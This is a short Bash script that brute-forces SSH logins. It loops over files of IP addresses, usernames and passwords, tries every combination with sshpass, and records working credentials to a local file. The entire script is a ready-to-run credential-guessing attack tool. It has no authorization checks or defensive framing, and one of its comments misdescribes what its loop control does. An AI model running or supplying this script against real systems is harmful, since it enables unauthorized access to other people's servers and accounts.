#!/bin/bash

# Paths to information files
file_ip="list_ip"
file_users="list_users"
file_passwd="list_passwd"
file_correct_data="correct_data"

# Start measuring script execution time
start_time=$(date +%s)

# Check the existence of files
for file in "$file_ip" "$file_users" "$file_passwd"; do
  if [ ! -f "$file" ]; then
    echo "Error: File $file not found."
    exit 1
  fi
done

# Read lists from files
readarray -t list_ip < "$file_ip"
readarray -t list_users < "$file_users"
readarray -t list_passwd < "$file_passwd"

# Check and record correct data
for ip in "${list_ip[@]}"; do
  for user in "${list_users[@]}"; do
    for passwd in "${list_passwd[@]}"; do

      # Execute SSH command to check login and password
      sshpass -p "$passwd" ssh "$user@$ip" exit
      # Check SSH exit code
      if [ $? -eq 0 ]; then
        echo "$ip $user $passwd" >> "$file_correct_data"
        echo "Success: Login '$user' and password '$passwd' are correct for IP '$ip'. Recorded in $file_correct_data"
        continue 2  # Continue both loops, even if a correct combination is found
      else
        echo "Error: Login '$user' and password '$passwd' are incorrect for IP '$ip'."
      fi

    done
  done
done

# Stop measuring script execution time
end_time=$(date +%s)
# Calculate total execution time
total_time=$((end_time - start_time))

# Message about the completion of the check and execution time
echo "Check completed. Total script execution time: $total_time seconds."
